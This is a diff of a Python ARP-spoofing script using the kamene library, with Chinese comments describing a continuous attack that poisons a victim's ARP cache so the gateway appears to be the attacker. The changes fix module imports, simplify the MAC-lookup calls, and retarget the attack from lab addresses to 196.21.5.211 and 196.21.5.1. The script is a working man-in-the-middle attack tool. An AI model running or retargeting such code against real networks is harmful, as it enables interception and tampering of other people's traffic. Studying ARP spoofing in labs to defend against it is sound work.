@@ -11,12 +11,20 @@
 import logging
 logging.getLogger("kamene.runtime").setLevel(logging.ERROR)  # 清除报错
 from kamene.all import *
+import os
+import sys
+
+# 获取当前文件所在目录的父目录（项目根目录）并添加到Python路径
+project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+sys.path.append(project_root)
+
 from tools.get_ip_netifaces import get_ip_address  # 导入获取本机IP地址方法
 from tools.get_mac_netifaces import get_mac_address  # 导入获取本机MAC地址方法
 from net_1_arp.arp_request import arp_request  # 导入之前创建的ARP请求脚本
 from tools.scapy_iface import scapy_iface  # 获取scapy iface的名字
 import time
 import signal
+
 
 
 def arp_spoof(ip_1, ip_2, ifname):
@@ -31,9 +39,9 @@ def arp_spoof(ip_1, ip_2, ifname):
     # 获取本机MAC地址，并且赋值到全局变量localmac
     localmac = get_mac_address(ifname)
     # 获取ip_1的真实MAC地址
-    ip_1_mac = arp_request(ip_1, scapy_ifname)[1]
+    ip_1_mac = arp_request(ip_1)[1]
     # 获取ip_2的真实MAC地址
-    ip_2_mac = arp_request(ip_2, scapy_ifname)[1]
+    ip_2_mac = arp_request(ip_2)[1]
     # 引入信号处理机制，如果出现ctl+c（signal.SIGINT），使用sigint_handler这个方法进行处理
     signal.signal(signal.SIGINT, sigint_handler)
     while True:  # 一直攻击，直到ctl+c出现！！！
@@ -69,6 +77,6 @@ if __name__ == "__main__":
     # 欺骗10.1.1.253 让它认为10.1.1.254的MAC地址为本地攻击者计算机的MAC
     import platform
     if platform.system() == "Linux":
-        arp_spoof('10.10.1.1', '10.10.1.254', 'ens224')
+        arp_spoof('196.21.5.211', '196.21.5.1', 'ens35')
     elif platform.system() == "Windows":
-        arp_spoof('10.10.1.1', '10.10.1.254', 'VMware Network Adapter VMnet1')
+        arp_spoof('196.21.5.211', '196.21.5.1', 'VMware Network Adapter VMnet1')
